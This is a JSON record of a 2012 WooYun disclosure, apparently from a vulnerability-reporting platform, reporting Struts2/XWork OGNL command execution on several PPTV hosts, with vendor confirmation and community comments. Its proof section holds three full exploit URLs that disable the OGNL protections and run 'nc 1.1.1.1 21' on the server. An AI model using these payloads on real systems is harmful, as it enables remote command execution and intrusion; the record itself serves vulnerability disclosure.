{"id": 18553, "wybug_id": "wooyun-2012-08658", "wybug_title": "再爆 PPTV struts命令执行", "wybug_corp": "PPTV(PPlive)", "wybug_author": "loopx9", "wybug_date": "2012-06-22 21:55", "wybug_open_date": "2012-08-06 21:56", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-06-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-06-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-07-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-07-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-07-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-08-06：\t细节向公众公开  简要描述：     不知道是不是与   http://www.wooyun.org/bugs/wooyun-2010-05543   http://www.wooyun.org/bugs/wooyun-2010-05544提交的一样，但过去这么久还存在漏洞，今就再提交下。 详细说明：         老版本xwork命令执行.   漏洞证明：  \nhttp://tips.passport.pptv.com/getUsertipNum.do?('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023foo')(\\u0023foo\\u003dnew%20java.lang.Boolean(\"false\")))&(asdf)(('\\u0023rt.exec(\"nc 1.1.1.1 21\")')(\\u0023rt\\u003d@java.lang.Runtime@getRuntime()))=1\n\n\n\nhttp://passport.pptv.com/getUsertipNum.do?('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023foo')(\\u0023foo\\u003dnew%20java.lang.Boolean(\"false\")))&(asdf)(('\\u0023rt.exec(\"nc 1.1.1.1 21\")')(\\u0023rt\\u003d@java.lang.Runtime@getRuntime()))=1\n\n\n\nhttp://home.pplive.com/getUsertipNum.do?('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023foo')(\\u0023foo\\u003dnew%20java.lang.Boolean(\"false\")))&(asdf)(('\\u0023rt.exec(\"nc 1.1.1.1 21\")')(\\u0023rt\\u003d@java.lang.Runtime@getRuntime()))=1\n\n\n   修复方案：  打补丁   版权声明：转载请注明来源 loopx9@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2012-06-23 20:28 厂商回复： thx 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-06-22 21:58 |    \t\tHenry:bobo \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:22        | 本胖吊！~又高又肥2个奶奶像地雷)\t\t \n  我操 给力！！！！！    \n     2012-06-23 00:14 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  沙发，给力    \n     2012-06-23 01:06 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  经测试,以前的两个修复了的    \n     2012-06-23 01:19 |    \t\tloopx9 \t\t\t( 核心白帽子 |\t\t\t        Rank:602 漏洞数:62        | ..)\t\t \n  同一域名换一请求地址，漏洞依然存在，猜可能是一个域名反向代理多个应用，而只修复了一部分，仍有一部分漏洞存在。    \n     2012-06-26 01:41 |    \t\thongygxiang \t\t\t( 普通白帽子  |\t\t\t        Rank:115 漏洞数:12        | 蛋疼)\t\t \n  @loopx9 强烈麻烦loopx9哥哥给下请求的url，给noid发了个邮件没鸟我哎。    \n     2012-07-24 09:39 |    \t\tVty \t\t\t( 普通白帽子  |\t\t\t        Rank:199 漏洞数:37        )\t\t \n  牛掰，服务器上是不是得有nc啊    \n     2012-07-25 08:41 |    \t\t半世倾尘 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 努力)\t\t \n  这个怎么漏洞利用啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}